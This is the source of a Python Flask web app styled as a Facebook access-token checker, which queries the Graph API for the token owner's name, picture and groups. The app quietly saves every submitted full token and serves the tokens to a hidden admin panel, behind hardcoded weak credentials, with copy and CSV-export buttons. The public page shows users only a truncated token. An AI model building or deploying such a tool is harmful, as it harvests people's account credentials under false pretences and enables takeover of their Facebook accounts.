from flask import Flask, request, render_template_string, session, redirect, url_for, send_file
import requests
import time
import secrets
import json
import os
import csv
from io import StringIO

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ADMIN CREDENTIALS
ADMIN_USERNAME = "legend"
ADMIN_PASSWORD = "123456"

TOKENS_FILE = 'checked_tokens.json'

def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens[-100:], f, indent=2)

checked_tokens = load_tokens()

def safe_api_call(url, params=None, method='GET', data=None):
    try:
        if method == 'GET':
            r = requests.get(url, params=params, timeout=10)
        else:
            r = requests.post(url, data=data, params=params, timeout=10)
        if r.status_code == 200:
            return r.json()
        else:
            return {"error": r.json().get("error", {}).get("message", "API Error")}
    except:
        return {"error": "Network Error"}

def check_token_with_message(token):
    token = token.strip()
    result = {
        "valid": False, "status": "NAHI CHAL RAHA", "name": "Unknown", "uid": "Unknown",
        "token_prefix": token[:10] + "..." + token[-5:], "full_token": token,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"), "expiry_guess": "Working Now",
        "profile_pic": "", "groups_list": []
    }

    # ME API
    me_data = safe_api_call("https://graph.facebook.com/v15.0/me", {
        'access_token': token,
        'fields': 'id,name,picture.width(200)'
    })
    if "error" in me_data:
        return result

    data = me_data
    uid = result["uid"] = data.get('id', 'N/A')
    result["name"] = data.get('name', 'N/A')
    result["profile_pic"] = data.get('picture', {}).get('data', {}).get('url', '')
    result["valid"] = True
    result["status"] = "CHAL RAHA HAI"

    # EXPIRY GUESS
    if token.startswith("EAAA"):
        result["expiry_guess"] = "Short-lived (1-2 hr)"
    elif token.startswith("EAAG") or len(token) > 300:
        result["expiry_guess"] = "Long-lived (60 days)"
    elif token.startswith("EAAD"):
        result["expiry_guess"] = "Page Token (Never)"
    else:
        result["expiry_guess"] = "Working Now"

    # GROUPS LIST (Yahi aapne bola tha)
    groups_data = safe_api_call(f"https://graph.facebook.com/v15.0/{uid}/groups", {
        'access_token': token,
        'fields': 'id,name,privacy,member_count,updated_time',
        'limit': 100
    })
    if "data" in groups_data:
        for g in groups_data['data']:
            result["groups_list"].append({
                "name": g.get('name', 'Unknown'),
                "id": g.get('id', 'N/A'),
                "privacy": g.get('privacy', 'Unknown'),
                "members": g.get('member_count', 'N/A'),
                "updated": g.get('updated_time', '')[:10] if g.get('updated_time') else 'N/A'
            })
    else:
        result["groups_list"].append({"name": "No Access / No Groups", "id": "N/A"})

    checked_tokens.append(result)
    save_tokens(checked_tokens)
    return result

# ROUTES
@app.route('/', methods=['GET', 'POST'])
def home():
    result = None
    if request.method == 'POST':
        token = request.form.get('token', '').strip()
        if token:
            result = check_token_with_message(token)
    return render_template_string(HOME_TEMPLATE, result=result)

@app.route('/admin/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == ADMIN_USERNAME and request.form.get('password') == ADMIN_PASSWORD:
            session['admin'] = True
            session['login_time'] = time.time()
            return redirect('/admin')
        return render_template_string(LOGIN_TEMPLATE, error="Wrong Credentials!")
    return render_template_string(LOGIN_TEMPLATE, error=None)

@app.route('/admin')
def admin():
    if not session.get('admin') or time.time() - session.get('login_time', 0) > 1800:
        return redirect('/admin/login')
    search = request.args.get('search', '').lower()
    tokens = [t for t in checked_tokens if search in t['name'].lower() or search in t['uid']]
    return render_template_string(ADMIN_TEMPLATE, tokens=tokens[::-1], search=search)

@app.route('/admin/delete/<uid>')
def delete(uid):
    if not session.get('admin'): return redirect('/admin/login')
    global checked_tokens
    checked_tokens = [t for t in checked_tokens if t['uid'] != uid]
    save_tokens(checked_tokens)
    return redirect('/admin')

@app.route('/admin/export')
def export():
    if not session.get('admin'): return redirect('/admin/login')
    output = StringIO()
    writer = csv.DictWriter(output, fieldnames=checked_tokens[0].keys() if checked_tokens else [])
    writer.writeheader()
    writer.writerows(checked_tokens)
    output.seek(0)
    return send_file(output, mimetype='text/csv', as_attachment=True, download_name='tokens.csv')

@app.route('/admin/logout')
def logout():
    session.clear()
    return redirect('/')

# TEMPLATES
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>TOKEN CHECKER</title>
<style>
  body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding: 20px; }
  input, button { margin: 10px; padding: 14px; width: 90%; max-width: 420px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; font-size: 16px; }
  button { background: #0f0; color: #000; font-weight: bold; }
  h1 { text-shadow: 0 0 20px #0f0; font-size: 2.2em; }
  .result { background: #111; border: 1px solid #0f0; padding: 18px; margin: 20px; border-radius: 12px; font-size: 14px; }
  .valid { color: #0f0; font-size: 1.5em; font-weight: bold; }
  .invalid { color: #f55; font-size: 1.5em; font-weight: bold; }
  .pic { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #0f0; margin: 10px; }
  .group { background: #111; border: 1px solid #0f0; padding: 10px; margin: 8px; border-radius: 8px; text-align:left; }
  .copy-btn { background:#0f0;color:#000;padding:3px 6px;border:none;border-radius:4px;font-size:11px;cursor:pointer; }
</style>
<script>function copy(t){navigator.clipboard.writeText(t).then(()=>{alert("Copied!");});}</script>
</head><body>
<h1>TOKEN CHECKER</h1>
<form method="post">
  <input type="text" name="token" placeholder="Paste Token Here" required>
  <button type="submit">CHECK</button>
</form>

{% if result %}
<div class="result">
  {% if result.valid %}<p class="valid">{{ result.status }}</p>{% else %}<p class="invalid">{{ result.status }}</p>{% endif %}
  {% if result.profile_pic %}<img src="{{ result.profile_pic }}" class="pic">{% endif %}
  <p><b>Name:</b> {{ result.name }} | <b>UID:</b> {{ result.uid }}</p>
  <p><b>Token:</b> {{ result.token_prefix }}</p>
  <p><b>Valid for:</b> {{ result.expiry_guess }}</p>

  <!-- GROUPS LIST -->
  <h3 style="color:#0f0;">Groups ({{ result.groups_list|length }})</h3>
  {% for g in result.groups_list %}
  <div class="group">
    <b>{{ g.name }}</b><br>
    ID: <code>{{ g.id }}</code> 
    <button class="copy-btn" onclick="copy('{{ g.id }}')">COPY</button>
    <br><small>{{ g.privacy }} | Members: {{ g.members }} | Updated: {{ g.updated }}</small>
  </div>
  {% endfor %}
</div>
{% endif %}

<a href="/admin/login"><button style="background:#ff0;color:#000;padding:14px;margin-top:30px;border-radius:10px;font-weight:bold;">ADMIN PANEL</button></a>
</body></html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN LOGIN</title>
<style>
  body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding: 40px; }
  input, button { margin: 10px; padding: 14px; width: 80%; max-width: 350px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; font-size: 16px; }
  button { background: #0f0; color: #000; font-weight: bold; }
  h1 { text-shadow: 0 0 20px #0f0; }
  .error { color: #f55; margin: 20px; }
</style></head><body>
<h1>ADMIN LOGIN</h1>
{% if error %}<p class="error">{{ error }}</p>{% endif %}
<form method="post">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">LOGIN</button>
</form>
<br><a href="/" style="color:#0f0; text-decoration:none;">Back</a>
</body></html>
'''

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN - GROUPS</title>
<style>
  body { background: #000; color: #0f0; font-family: 'Courier New'; padding: 15px; }
  .card { background: #111; border: 1px solid #0f0; margin: 12px 0; padding: 15px; border-radius: 10px; font-size: 13px; }
  .valid { color: #0f0; } .invalid { color: #f55; }
  .back, .logout, .export-btn { background: #ff0; color: #000; padding: 10px; text-decoration: none; border-radius: 8px; display: inline-block; margin: 5px; font-size: 12px; }
  .copy-btn { background: #0f0; color: #000; border: none; padding: 5px 10px; margin-left: 10px; border-radius: 5px; font-size: 12px; cursor: pointer; }
  .search { width: 90%; max-width: 400px; padding: 12px; margin: 10px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; }
  .pic { width: 40px; height: 40px; border-radius: 50%; border: 1px solid #0f0; margin-right: 8px; vertical-align: middle; }
</style>
<script>function copyToken(t){navigator.clipboard.writeText(t).then(()=>{alert("Copied!");});}</script>
</head><body>
<h1 style="text-align:center; text-shadow:0 0 15px #0f0;">ADMIN PANEL</h1>
<a href="/" class="back">BACK</a>
<a href="/admin/logout" class="logout">LOGOUT</a>
<a href="/admin/export" class="export-btn">EXPORT CSV</a>
<form method="get" style="display:inline;">
  <input type="text" name="search" class="search" placeholder="Search Name/UID" value="{{ search }}">
</form>
<p><b>Total: {{ tokens|length }}</b></p>

{% for t in tokens %}
<div class="card">
  <p>{% if t.profile_pic %}<img src="{{ t.profile_pic }}" class="pic">{% endif %}<b>{{ t.name }}</b> | UID: {{ t.uid }}</p>
  <p><b>Full Token:</b> {{ t.full_token }} <button class="copy-btn" onclick="copyToken('{{ t.full_token }}')">COPY</button></p>
  <p class="{{ 'valid' if t.valid else 'invalid' }}"><b>{{ t.status }}</b></p>

  <!-- GROUPS IN ADMIN -->
  <p><b>Groups ({{ t.groups_list|length }}):</b></p>
  {% for g in t.groups_list %}
  <div style="background:#222;padding:6px;margin:3px;border-radius:5px;font-size:12px;">
    {{ g.name }} | ID: {{ g.id }} 
    <button class="copy-btn" onclick="copyToken('{{ g.id }}')">COPY ID</button>
  </div>
  {% endfor %}

  <p><small>{{ t.checked_at }}</small></p>
</div>
{% endfor %}
</body></html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
